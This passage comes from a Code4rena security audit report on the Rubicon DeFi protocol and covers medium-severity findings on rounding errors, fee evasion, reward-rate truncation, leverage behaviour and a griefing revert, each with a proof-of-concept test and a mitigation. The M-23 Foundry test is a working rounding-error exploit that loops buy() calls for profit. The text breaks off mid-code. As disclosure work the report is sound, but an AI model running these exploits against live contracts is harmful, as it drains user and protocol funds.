*Submitted by [KingNFT](https://github.com/code-423n4/2023-04-rubicon-findings/issues/540), also found by [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1142), [cducrest](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1076), [Neon2835](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1042), [0xWaitress](https://github.com/code-423n4/2023-04-rubicon-findings/issues/342), [koxuan](https://github.com/code-423n4/2023-04-rubicon-findings/issues/277) and [J4de](https://github.com/code-423n4/2023-04-rubicon-findings/issues/233)*.

When users `buy()` from `RubiconMarket`, their `spend` is rounded down. Tokens with small decimals, such as WBTC and GUSD, are vulnerable to rounding error attack. Attackers can exploit it to get risk free profit.

### Proof of Concept

The issue arises on L319 of `buy()`, we can see calculation of `spend` is rounded down:

```solidity
File: contracts\RubiconMarket.sol
314:     function buy(
315:         uint256 id,
316:         uint256 quantity
317:     ) public virtual can_buy(id) synchronized returns (bool) {
318:         OfferInfo memory _offer = offers[id];
319:         uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt; // @audit should round up
...
447:         return true;
448:     }
```

The following test cases show how attackers can exploit it to get profit:

```solidity
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../../contracts/periphery/TokenWithFaucet.sol";
import "../../contracts/RubiconMarket.sol";
import "forge-std/Test.sol";

contract MockERC20 is ERC20 {
    uint8 private decimals_;

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) ERC20(_name, _symbol) {
        decimals_ = _decimals;
    }

    function decimals() public view override returns (uint8) {
        return decimals_;
    }

    function mint(address account, uint256 amount) external {
        _mint(account, amount * 10 ** decimals_);
    }
}

/// @notice proxy isn't used here
contract AttackOnRoundingError is Test {
  //========================CONSTANTS========================
  address public owner;
  address FEE_TO = 0x0000000000000000000000000000000000000FEE;
  address attacker = address(0x01020304);
  uint256 WBTCOfferId;
  uint256 GUSDOfferId;
  // core contracts
  RubiconMarket market;
  // test tokens
  MockERC20 USDC;
  MockERC20 WBTC;
  MockERC20 GUSD;

  function setUp() public {
    owner = msg.sender;

    // deploy new Market instance and init
    market = new RubiconMarket();
    market.initialize(FEE_TO);
    market.setFeeBPS(10);

    // deploy test tokens
    USDC = new MockERC20("Test Stablecoin", "USDC", 6);
    WBTC = new MockERC20("Wrapped BTC", "WBTC", 8);
    // the top 77th token: https://coinmarketcap.com/currencies/gemini-dollar/ 
    GUSD = new MockERC20("Gemini USD", "GUSD", 2);

    USDC.mint(address(this), 1_000_000);
    USDC.approve(address(market), type(uint256).max);
    // place ask and bid for WBTC/USDC pair at price 30,000 USDC/WBTC
    WBTCOfferId = market.offer(300000e6, USDC, 10e8, WBTC, address(this), owner);

    // place ask and bid for GUSD/USC pair at price 1 USDC/GUSD
    GUSDOfferId = market.offer(300000e6, USDC, 300000e2, GUSD, address(this), owner);


    WBTC.mint(attacker, 10);
    vm.prank(attacker);
    WBTC.approve(address(market), type(uint256).max);

    GUSD.mint(attacker, 100000);
    vm.prank(attacker);
    GUSD.approve(address(market), type(uint256).max);
  }

  function test_AttackOnWBTCPair() public {
    uint256 l2GasCost;
    uint256 USDCReceived;
    uint256 WBTCSent;
    { // stack too deep
      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);
      uint256 WBTCBalanceBefore = WBTC.balanceOf(attacker);

      vm.startPrank(attacker);
      uint256 gasBefore = gasleft();
      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M
          market.buy(WBTCOfferId, 599);
      }
      uint256 gasAfter = gasleft();
      vm.stopPrank();
      l2GasCost = gasBefore - gasAfter;
      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);
      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;
      uint256 WBTCBalanceAfter = WBTC.balanceOf(attacker);
      WBTCSent = WBTCBalanceBefore - WBTCBalanceAfter;
    }

    // reference https://dune.com/queries/508560/961244
    uint256 l1GasCost = 4013;
    uint256 l1GasPrice = 4e9;
    uint256 l2GasPrice = 0.001e9;
    uint256 ETHPrice = 2000e6;
    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;
    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;
    uint256 WBTCCostInUSDC = WBTCSent * 30000e6 / 1e8;
    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + WBTCCostInUSDC;
    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;
    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;

    console.log("==========Attack on WBTC pair==========");
    console.log("Given price: 2000 USDC/ETH, 30,000 USDC/BTC");
    console.log("Given L1(Ethereum) gas price: 4 Gwei");
    console.log("Given L2(Optimism) gas price: 0.001 Gwei");
    console.log("Given decimals: WBTC(8), USDC(6)");
    console.log("L1 gas cost:", l1GasCost);
    console.log("L1 gas cost in USDC:", l1GasCostInUSDC);
    console.log("L2 gas cost:", l2GasCost);
    console.log("L2 gas cost in USDC:", l2GasCostInUSDC);
    console.log("WBTC cost:", WBTCSent);
    console.log("WBTC cost in USDC:", WBTCCostInUSDC);
    console.log("Total cost in USDC:", totalCostInUSDC);
    console.log("USDC received:", USDCReceived);
    console.log("Profit in USDC:", profitInUSDC);
    console.log("Profit in percentage:", profitInPercentage, "%");
  }

  function test_AttackOnGUSDPair() public {
    uint256 l2GasCost;
    uint256 USDCReceived;
    uint256 GUSDSent;
    { // stack too deep
      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);
      uint256 GUSDBalanceBefore = GUSD.balanceOf(attacker);

      vm.startPrank(attacker);
      uint256 gasBefore = gasleft();
      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M
          market.buy(GUSDOfferId, 19_999);
      }
      uint256 gasAfter = gasleft();
      vm.stopPrank();
      l2GasCost = gasBefore - gasAfter;
      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);
      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;
      uint256 GUSDBalanceAfter = GUSD.balanceOf(attacker);
      GUSDSent = GUSDBalanceBefore - GUSDBalanceAfter;
    }

    // reference https://dune.com/queries/508560/961244
    uint256 l1GasCost = 4013;
    uint256 l1GasPrice = 20e9;
    uint256 l2GasPrice = 0.001e9;
    uint256 ETHPrice = 2000e6;
    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;
    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;
    uint256 GUSDCostInUSDC = GUSDSent * 1e6 / 1e2;
    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + GUSDCostInUSDC;
    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;
    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;

    console.log("==========Attack on GUSD pair==========");
    console.log("Given price: 2000 USDC/ETH, 30,000 USDC/BTC");
    console.log("Given L1(Ethereum) gas price: 20 Gwei");
    console.log("Given L2(Optimism) gas price: 0.001 Gwei");
    console.log("Given decimals: GUSD(2), USDC(6)");
    console.log("L1 gas cost:", l1GasCost);
    console.log("L1 gas cost in USDC:", l1GasCostInUSDC);
    console.log("L2 gas cost:", l2GasCost);
    console.log("L2 gas cost in USDC:", l2GasCostInUSDC);
    console.log("GUSD cost:", GUSDSent);
    console.log("GUSD cost in USDC:", GUSDCostInUSDC);
    console.log("Total cost in USDC:", totalCostInUSDC);
    console.log("USDC received:", USDCReceived);
    console.log("Profit in USDC:", profitInUSDC);
    console.log("Profit in percentage:", profitInPercentage, "%");
  }

}

```

### Case 1:  `WBTC/USDC` pair

The given market parameters and test result for Case 1:

```solidity
[PASS] test_AttackOnWBTCPair() (gas: 11427870)
Logs:
  ==========Attack on WBTC pair==========
  Given price: 2000 USDC/ETH, 30,000 USDC/BTC
  Given L1(Ethereum) gas price: 4 Gwei
  Given L2(Optimism) gas price: 0.001 Gwei
  Given decimals: WBTC(8), USDC(6)
  L1 gas cost: 4013
  L1 gas cost in USDC: 32104
  L2 gas cost: 14251627
  L2 gas cost in USDC: 28503
  WBTC cost: 300
  WBTC cost in USDC: 90000
  Total cost in USDC: 150607
  USDC received: 179700
  Profit in USDC: 29093
  Profit in percentage: 19 %
```

From the log, we can see a 19% profit in one attack. The absolute profit value is about 0.029 USDC, though it is small, but Optimism confirms transactions instantly, attackers can submit huge number of transactions such as 1M to get 29,000 USDC profit.

One point needs to be pointed out, market parameters other than L1 gas prices are consistent with the actual normal situations. The 4 Gwei L1 gas price is a a relatively low price, and it's a key condition to make the attack be profitable. But this scenario can actually happen, [here are some instances](https://public-grafana.optimism.io/d/9hkhMxn7z/public-dashboard?orgId=1&refresh=5m&viewPanel=6&from=now-1y&to=now&inspect=6&inspectTab=data) when a gas price drops below 4 Gwei.

```solidity
2022/8/21 18:00 | 1.56939
2022/9/19 18:00 | 2.3536
2022/9/17 12:00 | 2.63193
2022/7/31 12:00 | 2.87714
2022/8/21 12:00 | 2.99122
2022/7/31 6:00 | 3.03533
2022/10/5 18:00 | 3.14388
2022/9/4 18:00 | 3.15065
2022/10/2 18:00 | 3.18227
2022/9/4 6:00 | 3.19788
2022/7/31 18:00 | 3.20089
2022/8/1 12:00 | 3.22637
2022/9/4 12:00 | 3.34139
2022/8/20 18:00 | 3.57428
2022/9/18 12:00 | 3.57598
2022/9/22 18:00 | 3.60006
2022/8/14 18:00 | 3.63901
2022/9/18 6:00 | 3.72209
2022/9/12 12:00 | 3.74844
2022/8/29 0:00 | 3.8843
2022/8/21 6:00 | 3.94099
2022/9/25 12:00 | 3.97128
2022/9/21 18:00 | 3.98098
2022/8/6 18:00 | 3.98923
```

### Case 2:  `GUSD/USDC` pair

The given market parameters and test result for Case 2:

```solidity
[PASS] test_AttackOnGUSDPair() (gas: 11427889)
Logs:
  ==========Attack on GUSD pair==========
  Given price: 2000 USDC/ETH, 30,000 USDC/BTC
  Given L1(Ethereum) gas price: 20 Gwei
  Given L2(Optimism) gas price: 0.001 Gwei
  Given decimals: GUSD(2), USDC(6)
  L1 gas cost: 4013
  L1 gas cost in USDC: 160520
  L2 gas cost: 14251627
  L2 gas cost in USDC: 28503
  GUSD cost: 300
  GUSD cost in USDC: 3000000
  Total cost in USDC: 3189023
  USDC received: 5999400
  Profit in USDC: 2810377
  Profit in percentage: 88 %
```

For the `GUSD` pair, we can see even on a normal 20 Gwei L1 gas price condition, the attack profit rate is 88%. The absolute profit value in one attack is about 2.8 USDC. Similarly, attackers can submit huge number of transactions to make a significant profit.

### Recommended Mitigation Steps

Calculation of `spend` should be rounded up.

**[daoio (Rubicon) acknowledged and commented via duplicate issue #1142](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1142#issuecomment-1532825169):**
>It's interesting, but the amounts used are too small to be real. Moreover, such offers can't be created because they will probably exceed minimum sell amount.

**[HickupHH3 (judge) commented via duplicate issue #1142](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1142#issuecomment-1560383965):**
>I agree that the stated amounts in the example are unlikely to be used practically, but they aren't small enough to the point where I can say it's negligible. Ie. larger than negligible, but smaller than for practical usage.
>
>Will let this issue stand as Medium severity.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/540#issuecomment-1560385086):**
 > Well written! Choosing this for the report because it factors in gas conditions.

***

## [[M-24] Zero reward rate calculation impedes low-decimals token distributions](https://github.com/code-423n4/2023-04-rubicon-findings/issues/489)
*Submitted by [0xNineDec](https://github.com/code-423n4/2023-04-rubicon-findings/issues/489), also found by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1293), [Ruhum](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1191), [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1155), [Ignite](https://github.com/code-423n4/2023-04-rubicon-findings/issues/993), [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/905), [Ace-30](https://github.com/code-423n4/2023-04-rubicon-findings/issues/864), [Ace-30](https://github.com/code-423n4/2023-04-rubicon-findings/issues/857), [KingNFT](https://github.com/code-423n4/2023-04-rubicon-findings/issues/814), [AlexCzm](https://github.com/code-423n4/2023-04-rubicon-findings/issues/805), [SaeedAlipoor01988](https://github.com/code-423n4/2023-04-rubicon-findings/issues/689), [ktg](https://github.com/code-423n4/2023-04-rubicon-findings/issues/648), [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/414), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/331), [SpicyMeatball](https://github.com/code-423n4/2023-04-rubicon-findings/issues/302) and [J4de](https://github.com/code-423n4/2023-04-rubicon-findings/issues/229)*.

Several (token, distribution period) couples are not feasible in `BathBuddy`, forcing the owner to set shorter distributions or providing more amount of tokens to be distributed.

In `BathBuddy`, the reward rate of a distribution is calculated following a linear distribution according to the amount of rewards to be distributed across the period:

```solidity
function notifyRewardAmount(
    uint256 reward,
    IERC20 rewardsToken
) external onlyOwner updateReward(address(0), address(rewardsToken)) {
    if (block.timestamp >= periodFinish[address(rewardsToken)]) {
        rewardRates[address(rewardsToken)] = reward.div(
            rewardsDuration[address(rewardsToken)]
        );
    } else {
        uint256 remaining = periodFinish[address(rewardsToken)].sub(
            block.timestamp
        );
        uint256 leftover = remaining.mul(
            rewardRates[address(rewardsToken)]
        );
        rewardRates[address(rewardsToken)] = reward.add(leftover).div(
            rewardsDuration[address(rewardsToken)]
        );
    }
```

The rate for each reward token spreads the `reward` amount across the `rewardsDuration`:

```solidity
rewardRates[address(rewardsToken)] = reward.div(
    rewardsDuration[address(rewardsToken)]
);
```

Because the `SafeMath` implementation asks for compiler versions over `0.8.0` to execute the legacy division `a/b`, the reward rate could be zero for some distribution configurations, forcing the owner to reduce the duration or increase the reward amount. Bear in mind, that the implementation of the `BathBuddy` allows using arbitrary tokens for rewards.

### Proof of Concept

1.  The owner launches a distribution of WBTC and is forced to set a pair of `reward` and `rewardsDuration[address(rewardsToken)]` such that their integer division yields at least in `1`.
2.  Considering that the rate is `1`, the year has (`365 * 24 * 60 * 60 = 31.53e6`) seconds which yields in `0.31536 WBTC` `(`$`8,500 @ 27,000 USD/BTC)` at minimum of rewards per user.

The following test refactors the `bath-buddy.ts` deploy fixture with the following:

```
--- a/test/hardhat-tests/bath-buddy.ts
+++ b/test/hardhat-tests/bath-buddy.ts
@@ -44,9 +44,9 @@ describe("RubiconV2 rewards system", function () {
     );
     const testStableCoin = await testCoinFactory.deploy(
       owner.address,
-      "Test Stablecoin",
-      "TUSDC",
-      6
+      "Test WBTC",
+      "WBTC",
+      8
     );

-    await testStableCoin.transfer(buddy.address, parseUnits("10000", 6));
+    await testStableCoin.transfer(buddy.address, parseUnits("0.315", 8));
     await buddy.notifyRewardAmount(
-      parseUnits("10000", 6),
+      parseUnits("0.315", 8),
+      testStableCoin.address
+    );
```

And the test is the same as the one provided (`should get rewards from both Comptroller and BathBuddy`) only calculating the amount of rewards received by getting the balance before and after claiming them:

```
    it("gets abusive amount of rewards per year", async function () {
      const {
        owner,
        testCoin,
        testStableCoin,
        testRewardCoin,
        bathTEST,
        buddy,
        bathHouse,
        comptroller,
      } = await loadFixture(buddySetupFixtureAudit);

      expect(await comptroller.getCompAddress()).to.be.equal(
        testRewardCoin.address
      );
      const b0 = await testStableCoin.balanceOf(owner.address);

      await testCoin.approve(bathTEST.address, parseUnits("1000"));
      await bathTEST.mint(parseUnits("1000"));

      const earned = await buddy.earned(owner.address, testStableCoin.address);

      const earnedComp = await testRewardCoin.balanceOf(owner.address);
      expect(earnedComp).to.be.equal(0);

      // skip a year
      await time.increaseTo((await time.latest()) + 365 * 24 * 60 * 60);

      bathHouse.claimRewards([buddy.address], [testStableCoin.address]);

      const earned2 = await testStableCoin.balanceOf(owner.address);
      console.log(`Rewards earned per year: ${earned2.sub(b0)}`)
      const earnedComp2 = await testRewardCoin.balanceOf(owner.address);

      expect(earned).to.be.lt(earned2);
      expect(earnedComp).to.be.lt(earnedComp2);
    });
```

It can be seen that setting the distribution amount to `0.315e8` (slightly below the amount of seconds per year) yields in zero rewards:

```
Rewards earned per year: 0
```

And setting the distribution amount slightly over the seconds per year (`0.3154e8`) successfully yields in rewards:

```
Rewards earned per year: 31536000
```

### Recommended Mitigation Steps

Increase the precision scale of the reward rate calculation using a factor (e.g. `10**8`) multiplied to to the `amount` when calculating the distribution's rate.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/489#issuecomment-1535696981)**


**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/489#issuecomment-1552875549):**
 > Tough call in deciding between this and [#1293](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1293) for best report, but going with this.


***

## [[M-25] `RubiconMarket: buy()` may not take any fee for tokens with low decimal precision](https://github.com/code-423n4/2023-04-rubicon-findings/issues/457)
*Submitted by [PierrickGT](https://github.com/code-423n4/2023-04-rubicon-findings/issues/457), also found by [Evo](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1163), [caventa](https://github.com/code-423n4/2023-04-rubicon-findings/issues/510), [0xNineDec](https://github.com/code-423n4/2023-04-rubicon-findings/issues/499) and [carlitox477](https://github.com/code-423n4/2023-04-rubicon-findings/issues/386)*.

In the `buy` function of the `RubiconMarket` contract, a fee is subtracted on taker trades.
The default `feeBPS` is set to `1` which is equivalent to a fee of `0.01%` or `0.0001` in decimal form.

For tokens like gUSD with a low decimal precision of [2](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd), no fees will be taken on 3 figure trades since Solidity will round down the result to 0.

### Proof of Concept

The taker fee is calculated in the `buy` function of the `RubiconMarket` contract on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) and also in the `calcAmountAfterFee` function on [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).

The following reasoning also apply to the maker fee on [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346) and [L586](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586).

Let's take, for example, a 500 gUSD trade. Mathematically the fee would be:
`500 * 0.0001 = 0.05`.

In solidity, for a token with 2 decimal places, we would get:
`amount * feeBPS / 100_000 = 50000 * 1 / 100_000 = 0` cause it rounds down to 0.

It would allow a user to not pay any taker and/or maker fee on 3 figure trades.

### Tools Used

Foundry unit test available [here](https://github.com/PierrickGT/2023-04-rubicon/blob/b57d4deac109dc677eafd171b69540c534f24563/test/audit-tests/Audit.t.sol#L165)

### Recommended Mitigation Steps

You could either not support these type of tokens or add the following requires:

- Add `require(fee != 0)` to the `buy` function after calculating the fee on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) of the `RubiconMarket` contract.
- Add the same kind of require for the `makerFee` after [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346).
- And also add the same kind of require in the `calcAmountAfterFee` function after [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).

**[daoio (Rubicon) acknowledged and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/457#issuecomment-1535713504):**
 > Wow, 2 decimals is something extraordinary lol, but we won't support gUSD.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/457#issuecomment-1549881367):**
 > FYI, `EURS` is another stablecoin that has 2 decimals (ETH mainnet + Polygon).
> 
> I suppose in general low decimal tokens aren't really supported.

***

## [[M-26] The curve of short leverage position is not smooth and may cause users to open positions that are different from expectations](https://github.com/code-423n4/2023-04-rubicon-findings/issues/396)
*Submitted by [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/396)*.

The current implementation allows users to open short leverage of 1x.

```solidity
    function _leverageCheck(uint256 _leverage, bool _long) internal pure {
        uint256 _wad = WAD;
        uint256 _leverageMax = WAD.mul(3);

        _long // long can't be with 1x leverage
            ? require(
                _leverage > _wad && _leverage <= _leverageMax,
                "_leverageCheck{Long}: INVLAID LEVERAGE"
            )
            : require(
                _leverage >= _wad && _leverage <= _leverageMax,
                "_leverageCheck{Short}: INVLAID LEVERAGE"
            );
    }
```

When the user calls `sellAllAmountWithLeverage` with leverage == 1.0x , one 100% collateralization and borrowing is performed.

Consider the USDC collateralization factor of 0.7. The user uses 1000 USDC to short WBTC, `leverage == 1.0x`, the contract will collateralize 1000 USDC to borrow 700 USD WBTC, and then sell WBTC for 700 USDC, leaving the user with a position of 1700 USDC.
When `leverage == 1.3x`, the contract borrows 300 USD worth of WBTC and then sells the WBTC for 300 USDC, leaving the user with a position of 1300 USDC.
And when `leverage == 1.7x`, the contract borrows 700 USD worth of WBTC and then sells the WBTC for 700 USDC, leaving the user with a position of 1700 USDC.
We note that when the leverage is 1.0x and 1.7x, the user's position is the same, and the 1.3x position is smaller than the 1.0x position. This unsmoothed curve of short leverage position may cause the user to open a different position than expected.

### Proof of Concept

The following POC shows that when the leverage is 1.0x and 1.7x, the user's position is the same.

```js
      it("TESTME", async function () {
        const { owner, testCoin, testStableCoin, Position } = await loadFixture(
          deployPoolsUtilityFixture
        );

        await Position.connect(owner).sellAllAmountWithLeverage(
          testStableCoin.address,
          testCoin.address,
          TUSDC_AMOUNT,
          x1
        );

        // fetch position with id 1
        const position = await Position.positions(1);
        expect(await Position.owner()).to.equal(owner.address);
        // position.asset == testStablecoin
        expect(position[0]).to.equal(testStableCoin.address);
        // position.quote == testCoin
        expect(position[1]).to.equal(testCoin.address);
        console.log("borrowedAmount : %s",position[2]);
      });
      it("TESTME2", async function () {
        const { owner, testCoin, testStableCoin, Position } = await loadFixture(
          deployPoolsUtilityFixture
        );
        const x1_7 = parseUnits("1.7");

        await Position.connect(owner).sellAllAmountWithLeverage(
          testStableCoin.address,
          testCoin.address,
          TUSDC_AMOUNT,
          x1_7
        );

        // fetch position with id 1
        const position = await Position.positions(1);
        expect(await Position.owner()).to.equal(owner.address);
        // position.asset == testStablecoin
        expect(position[0]).to.equal(testStableCoin.address);
        // position.quote == testCoin
        expect(position[1]).to.equal(testCoin.address);
        console.log("borrowedAmount : %s",position[2]);
      });
```

```
  Leverage positions Test
    Pools Utility Test
      Short positions 📉
borrowedAmount : 19444444444444444444
        ✓ TESTME
borrowedAmount : 19444444444444444444
        ✓ TESTME2
```

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118>

### Recommended Mitigation Steps

Consider no longer supporting 1.0x short leverage.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/396#issuecomment-1535717705)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/396#issuecomment-1549863137):**
 > Nice find!


***

## [[M-27] Both buyAllAmountWithLeverage and sellAllAmountWithLeverage always revert](https://github.com/code-423n4/2023-04-rubicon-findings/issues/293)
*Submitted by [nobody2018](https://github.com/code-423n4/2023-04-rubicon-findings/issues/293), also found by [Bauer](https://github.com/code-423n4/2023-04-rubicon-findings/issues/546)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L545> <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319>

Both `buyAllAmountWithLeverage` and `sellAllAmountWithLeverage` always revert. **So all users cannot open a leveraged position**.

### Proof of Concept

`openPosition` is the entry point for users to open long/short positions, internally calling the `_borrowLimit` function to calculate an amount of iterations needed to reach desired amount with leverage. The logic of this function is: if the collateral has been provided, then the `_maxBorrow` function will be called to calculate the maximum amount available to borrow from `_bathToken` market, and then the returned result will be added to the `_loopBorrowed` variable.

```solidity
// check if collateral was already supplied
        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));
    // how much is borrowed on a current loop
        uint256 _loopBorrowed;

        while (_assetAmount <= _desiredAmount) {
            if (_limit == 0) {
        // if collateral already provided
                if (_minted != 0) {
                    uint256 _max = _maxBorrow(_bathToken);

            // take into account previous collateral
                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(
                        _max
                    );
```

Next, look at the code of `_maxBorrow`:

```solidity
function _maxBorrow(
        address _bathToken
    ) internal view returns (uint256 _max) {
        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller
            .getAccountLiquidity(address(this));		//if address(this) is new user of comptroller, _liq always equal to 0

        require(_err == 0, "_maxBorrow: ERROR");
        require(_liq > 0, "_maxBorrow: LIQUIDITY == 0");	//if _liq equals to 0, tx will revert.
        require(_shortfall == 0, "_maxBorrow: SHORTFALL != 0");

        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));
        _max = (_liq.mul(10 ** 18)).div(_price);
        require(_max > 0, "_maxBorrow: can't borrow 0");
    }
```

To make the `_liq` returned by `comptroller.getAccountLiquidity(address(this))` be 0, then `address(this)` must not provide any collateral. In other words, **this contract is a new user to the comptroller**. Obviously, the `Position` contract created by the user meets this condition.

The condition for calling `_maxBorrow` is that `IERC20(_bathToken).balanceOf(address(this))` returns a non-zero value. **A newly created Position contract does not have any tokens. However, we can transfer 1wei `_bathToken` to it**. This allows the code to execute to `_maxBorrow` and revert.

**There are two ways to transfer `_bathToken` to the newly created `Position`**:

1.  Front-run `buyAllAmountWithLeverage` or `sellAllAmountWithLeverage`.
2.  Once the Position is created, transfer all `_bathTokens` supported by `BathHouseV2` to it. The amount transferred is 1wei.

In fact, `_maxBorrow` will also revert in normal scenario. `Position` borrows other tokens resulting in `_liq` being 0.

### Recommended Mitigation Steps

We should use `comptroller.getAccountLiquidity` instead of the balance of `_bathToken` as the condition for calling `_maxBorrow`.

```diff
--- a/contracts/utilities/poolsUtility/Position.sol
+++ b/contracts/utilities/poolsUtility/Position.sol
@@ -534,7 +534,7 @@ contract Position is Ownable, DSMath {
         uint256 _desiredAmount = wmul(_assetAmount, _leverage);

         // check if collateral was already supplied
-        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));
+        (,uint256 _minted,) = comptroller.getAccountLiquidity(address(this));
        // how much is borrowed on a current loop
         uint256 _loopBorrowed;
```

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/293#issuecomment-1547149797)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/293#issuecomment-1549767282):**
 > Medium: loss of functionality due to griefing from external party.
 >
 > Marking as best because it mentions an additional attack path compared to counterpart.

***

## [[M-28] Incorrect fee handling in `Position.sol's` Market `Buy`/`Sell` functions](https://github.com/code-423n4/2023-04-rubicon-findings/issues/282)
*Submitted by [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/282), also found by [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1332), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1308), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1299), [qpzm](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1251), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1208), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1206), [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1149), [kutugu](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1006), [rbserver](https://github.com/code-423n4/2023-04-rubicon-findings/issues/897), [sinarette](https://github.com/code-423n4/2023-04-rubicon-findings/issues/812), [R2](https://github.com/code-423n4/2023-04-rubicon-findings/issues/799), [carrotsmuggler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/726), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/653), [peakbolt](https://github.com/code-423n4/2023-04-rubicon-findings/issues/600), [caventa](https://github.com/code-423n4/2023-04-rubicon-findings/issues/596), [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/571), [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/566), [anodaram](https://github.com/code-423n4/2023-04-rubicon-findings/issues/503), [top1st](https://github.com/code-423n4/2023-04-rubicon-findings/issues/447), [RaymondFam](https://github.com/code-423n4/2023-04-rubicon-findings/issues/378), [T1MOH](https://github.com/code-423n4/2023-04-rubicon-findings/issues/361), [T1MOH](https://github.com/code-423n4/2023-04-rubicon-findings/issues/304) and [volodya](https://github.com/code-423n4/2023-04-rubicon-findings/issues/205)*.

The incorrect fee handling in the `Position.sol` market buy and sell functions can lead to improper fee deductions and wrong trade execution.

### Proof of Concept

In `Position.t.sol`, `_rubiconSwap_` executes the order in the `RubiconMarket` when opening/closing a position.

`rubiconSwap` can call either `marketBuy` or `marketSell`, depending on the circumstances.

The issue is that both [marketBuy](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473) and [marketSell](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511) account for fees, where they shouldn't.

```solidity
    function _marketBuy(
        address _asset,
        address _quote,
        uint256 _maxFill
    ) internal {
        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);

        // @audit fee is applied twice?
        uint256 _buyAmount = rubiconMarket.getBuyAmount(
